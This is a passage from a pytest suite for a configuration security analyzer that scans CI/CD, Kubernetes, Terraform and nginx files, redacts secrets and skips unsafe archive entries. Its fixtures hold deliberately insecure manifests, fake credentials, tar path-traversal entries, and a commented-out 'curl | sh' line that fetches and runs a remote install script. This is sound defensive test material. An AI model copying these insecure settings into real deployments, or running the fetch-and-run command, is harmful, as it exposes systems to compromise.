    assert "fixture-token" not in serialized
    assert "env-secret-should-not-be-read" not in serialized
    assert pinned_sha not in json.dumps(payload["findings"])
    assert "[REDACTED]" in serialized


@pytest.mark.anyio
async def test_analyze_ci_cd_config_missing_permissions_comments_and_context(monkeypatch, tmp_path):
    workflow = b"""
name: example
on:
  push:
# pull_request_target:
#   curl -fsSL https://example.invalid/install.sh | sh
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo ok
"""
    archive_path = write_zip_archive(tmp_path, {".github/workflows/example-ci.yml": workflow})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/ci-cd-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    findings = {finding["id"]: finding for finding in payload["findings"]}
    assert response.status_code == 200
    assert "github_permissions_missing" in findings
    assert "broad_push_trigger" in findings
    assert "pull_request_target_used" not in findings
    assert "ci_curl_pipe_shell" not in findings
    assert findings["github_permissions_missing"]["context"] == "example"
    assert findings["github_permissions_missing"]["level"] == "info"


@pytest.mark.anyio
async def test_analyze_ci_cd_config_skips_unsafe_archive_entries(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        traversal_content = b"SECRET_KEY=traversal-secret\n"
        traversal_info = tarfile.TarInfo("../.github/workflows/ci.yml")
        traversal_info.size = len(traversal_content)
        archive.addfile(traversal_info, io.BytesIO(traversal_content))

        link_info = tarfile.TarInfo(".github/workflows/ci.yml")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "real-ci.yml"
        archive.addfile(link_info)

        hardlink_info = tarfile.TarInfo(".gitlab-ci.yml")
        hardlink_info.type = tarfile.LNKTYPE
        hardlink_info.linkname = "real-gitlab-ci.yml"
        archive.addfile(hardlink_info)

    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/ci-cd-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    payload = response.json()
    reasons = {item["skip_reason"] for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "path_traversal" in reasons
    assert "not_regular_file:symlink" in reasons
    assert "not_regular_file:hardlink" in reasons
    assert "ci_cd_config_path_traversal" in {finding["id"] for finding in payload["findings"]}
    assert "ci_cd_config_not_regular_file" in {finding["id"] for finding in payload["findings"]}
    assert "traversal-secret" not in serialized


@pytest.mark.anyio
async def test_analyze_ci_cd_config_respects_file_and_byte_limits(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "CI_CD_CONFIG_MAX_FILES", 1)
    monkeypatch.setattr(runner, "CI_CD_CONFIG_MAX_FILE_BYTES", 80)
    monkeypatch.setattr(runner, "CI_CD_CONFIG_MAX_TOTAL_BYTES", 120)
    archive_path = write_zip_archive(
        tmp_path,
        {
            ".github/workflows/ci.yml": b"name: ci\non:\n  push:\njobs:\n  test:\n    steps:\n      - run: echo ok\n",
            ".gitlab-ci.yml": b"SECRET_KEY=" + b"x" * 100 + b"\n",
            "azure-pipelines.yml": b"trigger:\n- main\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/ci-cd-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["truncated"] is True
    assert "file_too_large" in reasons
    assert "too_many_files" in reasons
    assert "xxxxxxxxxxxxxxxxxxxxxxxx" not in serialized


@pytest.mark.anyio
async def test_analyze_k8s_config_reports_passive_findings_and_redacts_secrets(monkeypatch, tmp_path):
    manifests = b"""
apiVersion: v1
kind: Secret
metadata:
  name: app-secret
  namespace: production
stringData:
  password: fixture-stringdata-secret
data:
  token: fixture-data-secret
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
  namespace: production
data:
  API_KEY: fixture-configmap-key
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
  namespace: default
spec:
  replicas: 1
  template:
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
        - name: app
          image: nginx:latest
          securityContext:
            privileged: true
            allowPrivilegeEscalation: true
          env:
            - name: SECRET_KEY
              value: fixture-env-secret
            - name: FROM_SECRET
              valueFrom:
                secretKeyRef:
                  name: app-secret
                  key: password
          volumeMounts:
            - name: docker-sock
              mountPath: /var/run/docker.sock
        - name: sidecar
          image: busybox:1.36
      volumes:
        - name: docker-sock
          hostPath:
            path: /var/run/docker.sock
---
apiVersion: v1
kind: Service
metadata:
  name: web-lb
  namespace: production
spec:
  type: LoadBalancer
---
apiVersion: v1
kind: Service
metadata:
  name: web-nodeport
  namespace: production
spec:
  type: NodePort
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: web
  namespace: production
spec:
  rules:
    - host: app.example.test
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: broad
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["*"]
"""
    archive_path = write_zip_archive(
        tmp_path,
        {
            "deploy/production/app.yaml": manifests,
            ".env.production": b"SECRET_KEY=env-secret-should-not-be-read\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/k8s-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["analyzer"] == "k8s_config_basic"
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["resources_detected"] >= 7
    assert payload["summary"]["workloads_detected"] == 1
    assert payload["summary"]["services_detected"] == 2
    assert payload["summary"]["secrets_detected"] == 1
    assert payload["summary"]["rbac_resources_detected"] == 1
    assert "k8s_secret_stringdata_present" in finding_ids
    assert "k8s_secret_plaintext_data" in finding_ids
    assert "k8s_configmap_secret_like_key" in finding_ids
    assert "env_secret_like_value" in finding_ids
    assert "env_from_secret_reference" in finding_ids
    assert "privileged_container" in finding_ids
    assert "allow_privilege_escalation_true" in finding_ids
    assert "host_network_enabled" in finding_ids
    assert "host_pid_enabled" in finding_ids
    assert "host_ipc_enabled" in finding_ids
    assert "host_path_volume_present" in finding_ids
    assert "docker_socket_mount" in finding_ids
    assert "image_latest_tag" in finding_ids
    assert "image_missing_digest" in finding_ids
    assert "resource_limits_missing" in finding_ids
    assert "resource_requests_missing" in finding_ids
    assert "service_type_loadbalancer" in finding_ids
    assert "service_type_nodeport" in finding_ids
    assert "ingress_tls_missing" in finding_ids
    assert "clusterrole_wildcard_verbs" in finding_ids
    assert "clusterrole_wildcard_resources" in finding_ids
    assert "replicas_singleton_hint" in finding_ids
    assert "liveness_probe_missing" in finding_ids
    assert "readiness_probe_missing" in finding_ids
    assert "namespace_missing_or_default" in finding_ids
    assert "k8s_config_real_env_file_not_read" in finding_ids
    assert "fixture-stringdata-secret" not in serialized
    assert "fixture-data-secret" not in serialized
    assert "fixture-configmap-key" not in serialized
    assert "fixture-env-secret" not in serialized
    assert "env-secret-should-not-be-read" not in serialized
    assert "[REDACTED]" in serialized


@pytest.mark.anyio
async def test_analyze_k8s_config_serialized_result_omits_sensitive_fixture_values(monkeypatch, tmp_path):
    manifests = b"""
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
  namespace: production
spec:
  template:
    spec:
      containers:
        - name: app
          image: registry-user:registry-pass/k8s-app:latest
          env:
            - name: PASSWORD
              value: super-secret-password
            - name: API_KEY
              value: raw-api-key-123456
---
apiVersion: v1
kind: Secret
metadata:
  name: app-secret
stringData:
  password: db_password_plaintext
  privateKey: |
    -----BEGIN PRIVATE KEY-----
    token_should_never_render
    -----END PRIVATE KEY-----
data:
  token: token_should_never_render
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
data:
  API_KEY: raw-api-key-123456
"""
    archive_path = write_zip_archive(tmp_path, {"deploy/production/app.yaml": manifests})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/k8s-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["analyzer"] == "k8s_config_basic"
    assert "[REDACTED]" in serialized
    for secret in (
        "super-secret-password",
        "raw-api-key-123456",
        "token_should_never_render",
        "PRIVATE KEY",
        "db_password_plaintext",
        "registry-user:registry-pass",
    ):
        assert secret not in serialized


@pytest.mark.anyio
async def test_analyze_k8s_config_context_templates_and_comments(monkeypatch, tmp_path):
    example_manifest = b"""
apiVersion: apps/v1
kind: Deployment
metadata:
  name: demo
spec:
  template:
    spec:
      # hostNetwork: true
      containers:
        - name: app
          image: nginx
          securityContext:
            privileged: true
"""
    helm_template = b"""
apiVersion: apps/v1
kind: Deployment
metadata:
  name: templated
spec:
  template:
    spec:
      containers:
        - name: app
          securityContext:
            privileged: true
"""
    archive_path = write_zip_archive(
        tmp_path,
        {
            "examples/deployment.yaml": example_manifest,
            "charts/app/templates/deployment.yaml": helm_template,
            "kustomization.yaml": b"resources:\n  - deployment.yaml\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/k8s-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    findings = {finding["id"]: finding for finding in payload["findings"]}
    finding_ids = {finding["id"] for finding in payload["findings"]}
    privileged_findings = [finding for finding in payload["findings"] if finding["id"] == "privileged_container"]
    assert response.status_code == 200
    assert "helm_template_detected_not_rendered" in finding_ids
    assert "kustomize_detected_not_built" in finding_ids
    assert "host_network_enabled" not in finding_ids
    assert len(privileged_findings) == 1
    assert privileged_findings[0]["context"] == "example"
    assert privileged_findings[0]["level"] == "low"
    assert findings["helm_template_detected_not_rendered"]["level"] == "info"


@pytest.mark.anyio
async def test_analyze_k8s_config_skips_unsafe_archive_entries(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        traversal_content = b"apiVersion: v1\nkind: Secret\nstringData:\n  password: traversal-secret\n"
        traversal_info = tarfile.TarInfo("../k8s/secret.yaml")
        traversal_info.size = len(traversal_content)
        archive.addfile(traversal_info, io.BytesIO(traversal_content))

        link_info = tarfile.TarInfo("k8s/deployment.yaml")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "real-deployment.yaml"
        archive.addfile(link_info)

        hardlink_info = tarfile.TarInfo("k8s/service.yaml")
        hardlink_info.type = tarfile.LNKTYPE
        hardlink_info.linkname = "real-service.yaml"
        archive.addfile(hardlink_info)

    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/k8s-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    payload = response.json()
    reasons = {item["skip_reason"] for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "path_traversal" in reasons
    assert "not_regular_file:symlink" in reasons
    assert "not_regular_file:hardlink" in reasons
    assert "k8s_config_path_traversal" in {finding["id"] for finding in payload["findings"]}
    assert "k8s_config_not_regular_file" in {finding["id"] for finding in payload["findings"]}
    assert "traversal-secret" not in serialized


@pytest.mark.anyio
async def test_analyze_k8s_config_respects_file_and_byte_limits(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "K8S_CONFIG_MAX_FILES", 1)
    monkeypatch.setattr(runner, "K8S_CONFIG_MAX_FILE_BYTES", 80)
    monkeypatch.setattr(runner, "K8S_CONFIG_MAX_TOTAL_BYTES", 120)
    archive_path = write_zip_archive(
        tmp_path,
        {
            "k8s/deployment.yaml": b"apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n",
            "k8s/secret.yaml": b"apiVersion: v1\nkind: Secret\nstringData:\n  password: " + b"x" * 100 + b"\n",
            "k8s/service.yaml": b"apiVersion: v1\nkind: Service\nmetadata:\n  name: app\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/k8s-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["truncated"] is True
    assert "file_too_large" in reasons
    assert "too_many_files" in reasons
    assert "xxxxxxxxxxxxxxxxxxxxxxxx" not in serialized


@pytest.mark.anyio
async def test_analyze_terraform_config_reports_findings_and_redacts_secrets(monkeypatch, tmp_path):
    main_tf = b'''
terraform {
  required_providers {
    aws = {
      source = "hashicorp/aws"
      version = ">= 5.0"
    }
  }
  backend "s3" {
    bucket = "tf-state"
    access_key = "AKIAIOSFODNN7EXAMPLE"
    secret_key = "aws_secret_access_key_should_not_render"
  }
}

provider "aws" {
  region = "us-east-1"
  access_key = "AKIAIOSFODNN7EXAMPLE"
  secret_key = "aws_secret_access_key_should_not_render"
}

module "vpc" {
  source = "git::https://example.com/org/vpc.git"
}

variable "password" {
  default = "super-secret-password"
}

output "api_key" {
  value = "raw-api-key-123456"
  sensitive = false
}

resource "aws_security_group" "ssh" {
  ingress {
    from_port = 22
    to_port = 22
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_security_group" "rdp" {
  ingress {
    from_port = 3389
    to_port = 3389
    ipv6_cidr_blocks = ["::/0"]
  }
}

resource "aws_iam_policy" "wild" {
  policy = <<POLICY
{
  "Statement": [
    {
      "Action": "*",
      "Resource": "*"
    }
  ]
}
POLICY
}

resource "aws_s3_bucket_acl" "public" {
  bucket = "example"
  acl = "public-read"
}

resource "aws_instance" "web" {
  user_data = <<EOF
PASSWORD=super-secret-password
TOKEN=token_should_never_render
-----BEGIN PRIVATE KEY-----
token_should_never_render
-----END PRIVATE KEY-----
EOF
}
'''
    tfvars = b'''
db_password = "super-secret-password"
api_key = "raw-api-key-123456"
database_url = "postgres://user:pass@example.com/db"
'''
    tfstate = b'{"outputs":{"db_password":{"value":"db_password_plaintext"}},"private":"token_should_never_render"}'
    tfstate_backup = b'{"resources":[{"instances":[{"attributes":{"api_key":"raw-api-key-123456","password":"super-secret-password"}}]}]}'
    archive_path = write_zip_archive(
        tmp_path,
        {
            "environments/prod/main.tf": main_tf,
            "environments/prod/terraform.tfvars": tfvars,
            "environments/prod/terraform.tfstate": tfstate,
            "environments/prod/prod.tfstate.backup": tfstate_backup,
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/terraform-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["analyzer"] == "terraform_config_basic"
    assert payload["summary"]["files_reviewed"] == 2
    assert payload["summary"]["tfvars_files_detected"] == 1
    assert payload["summary"]["state_files_detected"] == 2
    assert payload["summary"]["providers_detected"] == 1
    assert payload["summary"]["backends_detected"] == 1
    assert payload["summary"]["modules_detected"] == 1
    assert payload["summary"]["resources_detected"] >= 5
    assert "terraform_tfvars_secret_like_key" in finding_ids
    assert "terraform_variable_default_secret_like" in finding_ids
    assert "terraform_output_sensitive_false_secret_like" in finding_ids
    assert "terraform_state_file_present" in finding_ids
    assert "terraform_backend_credentials_hint" in finding_ids
    assert "terraform_provider_credentials_hint" in finding_ids
    assert "terraform_plaintext_private_key_hint" in finding_ids
    assert "terraform_secret_in_user_data_hint" in finding_ids
    assert "terraform_provider_version_unpinned" in finding_ids
    assert "terraform_module_source_unpinned" in finding_ids
    assert "terraform_lockfile_missing" in finding_ids
    assert "aws_security_group_ingress_any_ipv4" in finding_ids
    assert "aws_security_group_ingress_any_ipv6" in finding_ids
    assert "aws_security_group_ssh_open_world" in finding_ids
    assert "aws_security_group_rdp_open_world" in finding_ids
    assert "aws_iam_policy_wildcard_action" in finding_ids
    assert "aws_iam_policy_wildcard_resource" in finding_ids
    assert "aws_s3_bucket_public_access_risk" in finding_ids
    assert payload["state_files"][0]["read"] is False
    assert all(state_file["read"] is False for state_file in payload["state_files"])
    assert "[REDACTED]" in serialized
    for secret in (
        "super-secret-password",
        "raw-api-key-123456",
        "token_should_never_render",
        "PRIVATE KEY",
        "db_password_plaintext",
        "AKIAIOSFODNN7EXAMPLE",
        "aws_secret_access_key_should_not_render",
        "postgres://user:pass@example.com/db",
    ):
        assert secret not in serialized


@pytest.mark.anyio
async def test_analyze_terraform_config_comments_context_and_required_version(monkeypatch, tmp_path):
    main_tf = b'''
terraform {
  required_version = ">= 1.6"
}

# resource "aws_security_group" "commented" {
#   ingress {
#     from_port = 22
#     cidr_blocks = ["0.0.0.0/0"]
#   }
# }

variable "password" { default = "super-secret-password" }
'''
    archive_path = write_zip_archive(tmp_path, {"examples/main.tf": main_tf})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/terraform-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    variable_finding = next(finding for finding in payload["findings"] if finding["id"] == "terraform_variable_default_secret_like")
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "aws_security_group_ssh_open_world" not in finding_ids
    assert "terraform_required_version_missing" not in finding_ids
    assert variable_finding["context"] == "example"
    assert variable_finding["level"] == "low"
    assert "super-secret-password" not in serialized


@pytest.mark.anyio
async def test_analyze_terraform_config_skips_unsafe_archive_entries(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        traversal_content = b'db_password = "super-secret-password"\n'
        traversal_info = tarfile.TarInfo("../terraform/secrets.tfvars")
        traversal_info.size = len(traversal_content)
        archive.addfile(traversal_info, io.BytesIO(traversal_content))

        link_info = tarfile.TarInfo("terraform/main.tf")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "real-main.tf"
        archive.addfile(link_info)

        hardlink_info = tarfile.TarInfo("terraform/vars.tfvars")
        hardlink_info.type = tarfile.LNKTYPE
        hardlink_info.linkname = "real-vars.tfvars"
        archive.addfile(hardlink_info)

    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/terraform-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    payload = response.json()
    reasons = {item["skip_reason"] for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "path_traversal" in reasons
    assert "not_regular_file:symlink" in reasons
    assert "not_regular_file:hardlink" in reasons
    assert "terraform_config_path_traversal" in {finding["id"] for finding in payload["findings"]}
    assert "terraform_config_not_regular_file" in {finding["id"] for finding in payload["findings"]}
    assert "super-secret-password" not in serialized


@pytest.mark.anyio
async def test_analyze_terraform_config_respects_file_and_byte_limits(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "TERRAFORM_CONFIG_MAX_FILES", 1)
    monkeypatch.setattr(runner, "TERRAFORM_CONFIG_MAX_FILE_BYTES", 80)
    monkeypatch.setattr(runner, "TERRAFORM_CONFIG_MAX_TOTAL_BYTES", 120)
    archive_path = write_zip_archive(
        tmp_path,
        {
            "terraform/main.tf": b'terraform { required_version = ">= 1.6" }\n',
            "terraform/secret.tfvars": b'db_password = "' + b"x" * 100 + b'"\n',
            "terraform/extra.tf": b'provider "aws" { region = "us-east-1" }\n',
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/terraform-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["truncated"] is True
    assert "file_too_large" in reasons
    assert "too_many_files" in reasons
    assert "xxxxxxxxxxxxxxxxxxxxxxxx" not in serialized


@pytest.mark.anyio
async def test_analyze_nginx_config_reports_findings_includes_and_redacts_secrets(monkeypatch, tmp_path):
    nginx_conf = b'''
# server_tokens on;
server {
  listen 80 default_server;
  server_name example.com;
  server_tokens on;
  autoindex on;
  ssl_certificate /etc/ssl/certs/site.crt;
  ssl_certificate_key /etc/ssl/private/site.key;
  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
  add_header Strict-Transport-Security "max-age=60";
  add_header Access-Control-Allow-Origin *;
  add_header Access-Control-Allow-Credentials true;
  add_header Set-Cookie "sessionid=secret-session-cookie";
  proxy_ssl_verify off;
  client_max_body_size 0;
  access_log off;
  error_log /var/log/nginx/error.log debug;
  include /etc/nginx/secrets.conf;
  include conf.d/*.conf;

  location /.git {
    proxy_pass http://user:pass@example.com;
    proxy_set_header Authorization "Bearer token_should_never_render";
    stub_status;
  }

  location /phpinfo.php {
    deny all;
  }

  location /backup.sql {
    deny all;
  }

  location /api {
    proxy_pass http://internal:8080;
    proxy_read_timeout 600s;
    proxy_connect_timeout 600s;
    set $api_key raw-api-key-123456;
    set $proxy_password proxy_password_should_not_render;
    set $registry_user registry-user:registry-pass;
    auth_basic "super-secret-password";
  }
}

-----BEGIN PRIVATE KEY-----
token_should_never_render
-----END PRIVATE KEY-----
'''
    archive_path = write_zip_archive(tmp_path, {"sites-enabled/default.conf": nginx_conf})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/nginx-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["analyzer"] == "nginx_config_basic"
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["server_blocks_detected"] == 1
    assert payload["summary"]["location_blocks_detected"] == 4
    assert payload["summary"]["includes_detected"] == 2
    assert payload["summary"]["tls_servers_detected"] == 1
    assert "nginx_server_tokens_on" in finding_ids
    assert "nginx_autoindex_on" in finding_ids
    assert "nginx_ssl_protocol_legacy_enabled" in finding_ids
    assert "nginx_hsts_low_max_age" in finding_ids
    assert "nginx_x_frame_options_missing" in finding_ids
    assert "nginx_content_security_policy_missing" in finding_ids
    assert "nginx_x_content_type_options_missing" in finding_ids
    assert "nginx_referrer_policy_missing" in finding_ids
    assert "nginx_security_headers_missing" in finding_ids
    assert "nginx_cors_wildcard_origin" in finding_ids
    assert "nginx_cors_credentials_with_wildcard" in finding_ids
    assert "nginx_proxy_ssl_verify_off" in finding_ids
    assert "nginx_proxy_pass_credentials_hint" in finding_ids
    assert "nginx_proxy_pass_http_upstream" in finding_ids
    assert "nginx_proxy_set_header_host_missing" in finding_ids
    assert "nginx_proxy_set_header_x_forwarded_proto_missing" in finding_ids
    assert "nginx_proxy_set_header_x_forwarded_for_missing" in finding_ids
    assert "nginx_client_max_body_size_unlimited_or_large" in finding_ids
    assert "nginx_proxy_read_timeout_high" in finding_ids
    assert "nginx_proxy_connect_timeout_high" in finding_ids
    assert "nginx_access_log_off" in finding_ids
    assert "nginx_error_log_debug" in finding_ids
    assert "nginx_hidden_files_exposed" in finding_ids
    assert "nginx_sensitive_location_exposed" in finding_ids
    assert "nginx_backup_files_exposed" in finding_ids
    assert "nginx_stub_status_public_hint" in finding_ids
    assert "nginx_include_absolute_path" in finding_ids
    assert "nginx_include_glob_detected" in finding_ids
    assert "nginx_include_not_resolved" in finding_ids
    assert "nginx_basic_auth_inline_secret_hint" in finding_ids
    assert "nginx_header_secret_like_value" in finding_ids
    assert "nginx_variable_secret_like_value" in finding_ids
    assert "nginx_ssl_certificate_key_path_present" in finding_ids
    assert "[REDACTED]" in serialized
    for secret in (
        "super-secret-password",
        "raw-api-key-123456",
        "token_should_never_render",
        "Authorization: Bearer token_should_never_render",
        "http://user:pass@example.com",
        "registry-user:registry-pass",
        "sessionid=secret-session-cookie",
        "proxy_password_should_not_render",
        "PRIVATE KEY",
    ):
        assert secret not in serialized


@pytest.mark.anyio
async def test_analyze_nginx_config_records_includes_without_resolving_candidate_snippet(monkeypatch, tmp_path):
    main_conf = b'''
server {
  listen 80;
  include conf.d/snippet.conf;
}
'''
    snippet_conf = b'''
server {
  server_name snippet.example;
  set $proxy_password proxy_password_should_not_render;
}
'''
    archive_path = write_zip_archive(
        tmp_path,
        {
            "nginx/main.conf": main_conf,
            "conf.d/snippet.conf": snippet_conf,
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/nginx-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    serialized = json.dumps(payload)
    reviewed_paths = {item["path"] for item in payload["files_reviewed"]}
    include_targets = {item["target"]: item for item in payload["includes"]}
    assert response.status_code == 200
    assert reviewed_paths == {"nginx/main.conf", "conf.d/snippet.conf"}
    assert include_targets["conf.d/snippet.conf"]["resolved"] is False
    assert payload["summary"]["includes_detected"] == 1
    assert "nginx_include_not_resolved" in {finding["id"] for finding in payload["findings"]}
    assert "proxy_password_should_not_render" not in serialized
    assert "[REDACTED]" in serialized


@pytest.mark.anyio
async def test_analyze_nginx_config_comments_missing_tls_and_context(monkeypatch, tmp_path):
    nginx_conf = b'''
# server_tokens on;
# autoindex on;
server {
  listen 443 ssl;
  server_name example.test;
}
'''
    archive_path = write_zip_archive(tmp_path, {"examples/nginx.conf": nginx_conf})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/nginx-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    ssl_finding = next(finding for finding in payload["findings"] if finding["id"] == "nginx_ssl_protocols_missing")
    assert response.status_code == 200
    assert "nginx_server_tokens_on" not in finding_ids
    assert "nginx_autoindex_on" not in finding_ids
    assert "nginx_ssl_protocols_missing" in finding_ids
    assert "nginx_hsts_missing" in finding_ids
    assert ssl_finding["context"] == "example"
    assert ssl_finding["level"] == "info"


@pytest.mark.anyio
async def test_analyze_nginx_config_skips_unsafe_archive_entries(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        traversal_content = b'set $password super-secret-password;\n'
        traversal_info = tarfile.TarInfo("../nginx/secrets.conf")
        traversal_info.size = len(traversal_content)
        archive.addfile(traversal_info, io.BytesIO(traversal_content))

        link_info = tarfile.TarInfo("nginx/main.conf")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "real-main.conf"
        archive.addfile(link_info)

        hardlink_info = tarfile.TarInfo("nginx/site.conf")
        hardlink_info.type = tarfile.LNKTYPE
        hardlink_info.linkname = "real-site.conf"
        archive.addfile(hardlink_info)

    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
